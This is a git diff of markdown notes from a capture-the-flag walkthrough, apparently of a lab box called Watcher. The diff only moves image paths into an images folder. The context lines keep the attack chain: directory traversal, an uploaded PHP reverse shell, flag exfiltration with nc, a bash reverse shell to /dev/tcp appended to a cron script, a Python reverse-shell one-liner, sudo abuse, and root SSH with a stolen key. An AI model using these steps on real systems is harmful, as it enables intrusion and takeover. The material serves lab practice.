@@ -57,7 +57,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 
 ## Website
-![[Pasted image 20230707155443.png]]
+![[images/Pasted image 20230707155443.png]]
 
 
 Niktoscan
@@ -88,36 +88,36 @@ Niktoscan
 
 ### robots.txt
 
-  ![[robot.txt.png]]
+  ![[images/robot.txt.png]]
   - Secret File not accessable
 ##### flag_1.txt
-![[Pasted image 20230707155735.png]]
+![[images/Pasted image 20230707155735.png]]
 
 ### Directory Traversal possible
-![[Pasted image 20230707162434.png]]
+![[images/Pasted image 20230707162434.png]]
 ##### User List:
 - toby
 - mat
 - ftpuser
 - will
 -> Sensitive file: Secret file do not read
-![[Pasted image 20230707162723.png]]
+![[images/Pasted image 20230707162723.png]]
 -> Access to ftp
-![[Pasted image 20230707163026.png]]
+![[images/Pasted image 20230707163026.png]]
 ##### flag_2.txt
-![[Pasted image 20230707163105.png]]
+![[images/Pasted image 20230707163105.png]]
 #### Local File Inclusion
 -> Possible to add (pentestmonkey)php-reverse shell in files
 Save location: `/home/ftpuser/ftp/files/rev_shell.php`
 Access via Meterpreter/Metasploit
-![[flag_locations.png]]
+![[images/flag_locations.png]]
 ##### Flag_3.txt:
-![[Pasted image 20230707163842.png]]
+![[images/Pasted image 20230707163842.png]]
 Can execute sudo without password
-![[Pasted image 20230707164347.png]]
+![[images/Pasted image 20230707164347.png]]
 Spawn a shell: `sudo -u toby /bin/bash`
 Access flag_4.txt and download to attacker with nc
-![[Pasted image 20230707164754.png]]
+![[images/Pasted image 20230707164754.png]]
 There is a note
 ```shell
 Hi Toby,
@@ -133,11 +133,11 @@ Mat
 */1 * * * * mat /home/toby/jobs/cow.sh
 ```
 -> Every Minute cow.sh script is running
-![[Pasted image 20230707165303.png]]
+![[images/Pasted image 20230707165303.png]]
 Its modifiable
 `toby@watcher:/home/toby/jobs$ echo '/bin/bash -i >& /dev/tcp/10.18.90.87/4444 0>&1' >> cow.sh`
 ##### flag_5.txt
-![[Pasted image 20230707173036.png]]
+![[images/Pasted image 20230707173036.png]]
 Found note:
 ```shell
 Hi Mat,
@@ -165,7 +165,7 @@ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR
 ```
 `sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1`
 -> Got Access with will
-![[Pasted image 20230707174117.png]]
+![[images/Pasted image 20230707174117.png]]
 ```shell
 sudo -l
 ls -la /etc/passwd
@@ -186,4 +186,4 @@ Connect as Root
 ssh -i id_rsa root@10.10.56.139
 ```
 ##### flag_7.txt
-![[Pasted image 20230707182523.png]]
+![[images/Pasted image 20230707182523.png]]
